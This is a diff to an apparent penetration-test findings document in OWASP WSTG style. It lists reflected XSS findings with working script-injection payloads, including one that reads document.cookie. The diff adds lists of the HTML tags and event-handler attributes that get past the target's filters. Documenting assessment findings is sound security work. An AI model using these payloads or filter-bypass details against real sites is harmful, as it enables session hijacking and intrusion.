@@ -306,6 +306,8 @@ Command conventions, placeholders and output file naming are in [🧭 phase-walk
 - **Impact:** `HTML injection with <script>`
 - **Target**: `HTML body`
 - **Payload**: `page?=</p><script>alert(document.domain)</script>`
+- **Tags allowed**: `script img svg body input iframe details math marquee`
+- **Attributes allowed**: `onerror onload onfocus onmouseover onpointerover ontoggle`
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
@@ -321,6 +323,9 @@ Command conventions, placeholders and output file naming are in [🧭 phase-walk
 - **Payloads**: 
     - Causing error, so HTML is injected in body through JavaScript: `ToolID='''[['</td><script>alert(document.domain)</script>`
     - Breaking the JSON at JavaScript: `12312321"}});alert(document.domain);--`
+- **Tags allowed**: `script img svg body input iframe details math marquee`
+- **Attributes allowed**: `onerror onload onfocus onmouseover onpointerover ontoggle`
+
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
@@ -335,6 +340,8 @@ Command conventions, placeholders and output file naming are in [🧭 phase-walk
 - **Target**: `HTML body`
 - **Payloads**: 
     - Close style attribute and proceed with injection: `background_color="><script>alert(document.domain)</script>`
+- **Tags allowed**: `script img svg body input iframe details math marquee`
+- **Attributes allowed**: `onerror onload onfocus onmouseover onpointerover ontoggle`
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
@@ -349,6 +356,7 @@ Command conventions, placeholders and output file naming are in [🧭 phase-walk
 - **Target**: `HTML body`
 - **Payloads**: 
     - Direct html body injection (full chars): `textfile=</p><script>alert(document.domain)</script>`
+- **Tags allowed**: `script img svg body input iframe details math marquee`
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
@@ -364,6 +372,8 @@ Command conventions, placeholders and output file naming are in [🧭 phase-walk
 - **Payloads**: 
     - Direct html body injection (no errors): `</td><script>alert(document.domain)</script>`
     - Causing error, so HTML is injected in body through JavaScript: `'''[]</td><script>alert(document.domain)</script>`
+- **Tags allowed**: `script img svg body input iframe details math marquee`
+- **Attributes allowed**: `onerror onload onfocus onmouseover onpointerover ontoggle`
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
@@ -378,6 +388,8 @@ Command conventions, placeholders and output file naming are in [🧭 phase-walk
 - **Target**: `HTML body`
 - **Payloads**: 
     - Direct html body injection (no errors): `</h2><script>alert(document.domain)</script>`
+- **Tags allowed**: `script img svg body input iframe details math marquee`
+- **Attributes allowed**: `onerror onload onfocus onmouseover onpointerover ontoggle`
 
 #### `WSTG-INPV-01` · `Reflected XSS`
 
@@ -392,6 +404,8 @@ Command conventions, placeholders and output file naming are in [🧭 phase-walk
 - **Target**: `HTML body`
 - **Payloads**: 
     - Direct html body injection (no errors): `'''[[</td><script>alert(document.cookie)</script>`
+- **Tags allowed**: `script img svg body input iframe details math marquee`   
+- **Attributes allowed**: `onerror onload onfocus onmouseover onpointerover ontoggle`
 
 #### `<WSTG-ID>` · `<Finding title>`
 
